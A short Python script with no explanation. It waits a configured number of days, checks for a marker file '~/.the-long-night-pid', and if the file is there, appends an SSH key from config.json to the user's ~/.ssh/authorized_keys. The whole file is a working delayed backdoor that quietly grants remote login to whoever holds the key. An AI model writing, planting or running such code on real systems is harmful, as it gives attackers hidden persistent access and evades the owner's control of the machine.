#!/usr/bin/env python3

import time
import os
import json

with open('config.json') as f:
    config = json.load(f)

time.sleep(config["days"] * 86400)

if os.path.isfile(os.path.expanduser('~/.the-long-night-pid')):
    with open(os.path.expanduser('~/.ssh/authorized_keys'), 'a') as f:
        f.write("\n")
        f.write(config["ssh_key"])
        f.write("\n")
